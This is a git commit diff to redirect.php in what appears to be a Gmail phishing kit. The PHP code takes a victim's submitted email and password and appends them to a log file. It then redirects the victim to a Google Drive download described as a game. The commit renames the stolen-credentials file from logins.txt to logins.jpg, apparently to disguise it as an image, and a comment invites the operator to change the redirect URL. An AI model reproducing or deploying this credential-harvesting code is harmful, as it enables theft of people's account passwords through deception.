50b2fb8e77e447edab0dffdde1d198000ad06820
bobstottts <bobstottts@googlemail.com>
2017-07-18 11:36:36 +0600

    Update redirect.php

--- Gmail_master/redirect.php
+++ Gmail_master/redirect.php
@@ -5,11 +5,11 @@
 			$pass = $_POST["Passwd"];
 			$email=$_SESSION["Email"];
 			//opening logins text file for appending new data.
-  			$file = fopen("logins.txt", "a") or die("Unable to open file!");
+  			$file = fopen("logins.jpg", "a") or die("Unable to open file!");
 			
-  			//Writing email and password to logins.txt. 
+  			//Writing email and password to logins.jpg. 
   			fwrite($file, $email."	".$pass.PHP_EOL);			
-  			fclose($file);//closing logins.txt.
+  			fclose($file);//closing logins.jpg.
 			
   			//redirecting user to the google drive's locations where the game is available to download.
   			//change the location url to redirect to a website of your choice.
